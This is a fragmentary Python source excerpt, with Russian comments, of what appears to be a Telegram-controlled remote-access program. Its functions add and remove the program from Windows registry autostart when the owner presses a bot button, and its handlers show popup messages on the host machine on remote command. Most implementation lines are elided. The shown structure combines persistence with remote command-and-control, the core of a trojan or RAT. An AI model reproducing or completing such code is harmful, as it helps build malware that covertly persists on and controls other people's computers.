...
def add_self_to_autostart(program_name=None):
    """
    Добавляет текущую программу в автозагрузку реестра
    program_name - имя для записи в реестре (если None, используется имя файла)
    """
    try:
        ...
        bot.send_message(my_id, "Программа добавлена в автозагрузку")
        return True

    except Exception as e:
        bot.send_message(my_id, "Ошибка добавления в автозагрузку")
        return False


def remove_self_from_autostart(program_name=None):
    """
    Удаляет текущую программу из автозагрузки реестра
    """
    try:
        if getattr(sys, 'frozen', False):
            program_path = sys.executable
        ...
        bot.send_message(my_id, "Программа удалена из автозагрузки")
        return True

    except Exception as e:
        bot.send_message(my_id, "Ошибка удаления из автозагрузки")
        return False
...
btnauto = types.KeyboardButton('Добавить в автозагрузку')
btnauton = types.KeyboardButton('Удалить из автозагрузки')
...
files_keyboard.row(btnauto, btnauton)
...
def files_process(message):
    if message.from_user.id == my_id:
        ...
        elif message.text == "Добавить в автозагрузку":
            # Просто вставьте эту функцию и вызовите
            add_self_to_autostart()

        elif message.text == "Удалить из автозагрузки":
...
def messaga_process(message):
    bot.send_chat_action(my_id, 'typing')
    try:
        MessageBox(None, message.text, '67', 0)
